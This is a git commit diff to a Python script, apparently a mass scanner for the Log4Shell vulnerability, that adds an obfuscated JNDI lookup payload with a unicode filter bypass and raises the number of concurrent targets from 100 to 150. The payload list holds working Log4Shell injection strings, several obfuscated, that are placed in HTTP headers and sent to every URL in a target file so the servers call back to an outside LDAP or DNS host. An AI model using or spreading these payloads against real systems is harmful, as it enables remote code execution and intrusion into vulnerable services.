180314ec5c6cb7b69b34fb993ca5ca52d6dae999
K4r1it0 <39193373+K4r1it0@users.noreply.github.com>
2021-12-23 23:39:15 +0200

    Update log4j.py
    Add new payload and unicode support

--- log4j.py
+++ log4j.py
@@ -1,6 +1,7 @@
 import requests as without_encode
 import needle
 import sys
+import json
 import urllib.parse
 import random,string
 import requests.packages.urllib3
@@ -17,7 +18,8 @@ payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s.%s.%s/%s}
                        "${jndi:dns://%s.%s.%s/%s}",
                        "${jndi:ldap://127.0.0.1#%s.%s.%s/%s}",
                        "${jndi:ldap://127.0.0.1#%s.%s.%s/%s}",
-                       "${jndi:ldap://127.1.1.1#%s.%s.%s/%s}"]
+                       "${jndi:ldap://127.1.1.1#%s.%s.%s/%s}",
+                       "${j${k8s:k5:-ND}${sd:k5:-${123%%25ff:-${123%%25ff:-${upper:ı}:}}}ldap://%s.%s.%s/%s"]
 
 def rand():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k = 5))
@@ -30,7 +32,7 @@ def generate_header(payload,server,rand,target):
             if i == "":
                 continue
             headers.update({i: payload % (i,target,server,rand)})
-    return headers
+    return {k: str(v).encode("utf-8") for k,v in headers.items()}
 
 def start(url):
     host = url.split("/")[2]
@@ -45,7 +47,7 @@ def main():
         for url in file.readlines():
             url = url.strip().replace('\n','')
             targets.append((url,))
-    for i in needle.GroupWorkers(target=start, arguments=targets, concurrent=100):
+    for i in needle.GroupWorkers(target=start, arguments=targets, concurrent=150):
        pass
 
 if __name__ == '__main__':
